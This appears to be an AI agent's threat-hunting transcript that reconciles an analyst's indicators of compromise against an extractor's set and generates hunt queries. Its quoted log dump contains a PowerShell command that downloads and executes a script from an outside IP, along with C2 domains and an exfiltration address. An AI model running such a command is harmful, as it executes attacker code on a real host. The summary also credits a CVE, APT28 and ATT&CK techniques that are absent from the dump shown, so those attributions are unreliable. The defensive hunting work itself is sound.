content.text: Extractor returned the ground truth. Now generating hunt queries for the confirmed set (passing the same exact dump so hunts are built from ground-truth indicators):

input.text:
4812:powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/a.ps1')
4812:powershell.exe C2 evil-domain[.]ru fallback cobalt-c2[.]net mutex Global\\b3hq2k

4812:powershell.exe exfil to admin@evil-domain[.]ru SHA256 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08

content.text:
Reconciliation complete. The extractor's ground-truth set does **not** match the eyeballed report — two of the three reported IOCs had wrong values, and the analyst missed most of the indicator set.

## IOC Reconciliation Summary

### ✅ CONFIRMED (analyst correct)
- **`powershell.exe`** — confirmed as a filename indicator. ⚠️ Caveat: this is a legitimate LOLBin (living-off-the-land binary) being abused, not malware itself. Hunt on it only in combination with the args/child indicators below to avoid drowning in benign noise.

### ✏️ CORRECTED (analyst had the right indicator, wrong value)
- **Domain: `evil-domain.com` → `evil-domain.ru`** — the dump shows defanged `evil-domain[.]ru`. The `.com` TLD never appears; it was misread.
- **C2 IP: `185.220.101.50` → `185.220.101.5`** — the dump (and the embedded URL) show `185.220.101.5`. The trailing `0` was a transcription error / wrong last octet.

### ➕ MISSED by analyst (extractor-confirmed, must be added)
- **Domain:** `cobalt-c2.net` — explicit fallback C2
- **URL:** `http://185.220.101.5/a.ps1` — stager download
- **Filename:** `a.ps1` — dropped PowerShell payload
- **SHA256:** `9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08`
- **Email:** `admin@evil-domain.ru` — exfil address
- **CVE:** `CVE-2021-44228` (Log4Shell)
- **Threat actors:** `APT28` / `Fancy Bear`
- **MITRE ATT&CK:** `T1059.001` (PowerShell), `T1190` (Exploit Public-Facing App)

### ❓ UNVERIFIED / possible hallucination
- **None.** All three reported items mapped to a real extracted indicator (two corrected, one confirmed) — no item was a pure fabrication. Note the `Global\b3hq2k` mutex in the dump is a useful host artifact but is not a kind the extractor emits, so treat it as context, not a sweepable IOC.

### Hunt queries generated
`suggest_hunts` returned **14 validated** IOC-sweep queries (all `validated: true`) across three dialects for the confirmed/corrected set — CrowdStrike CQL (5), Cortex XQL (4), and Sigma (5), covering ip, domain, url, filename, and sha256. Ready to run; raise severity above the default `low` once one fires.
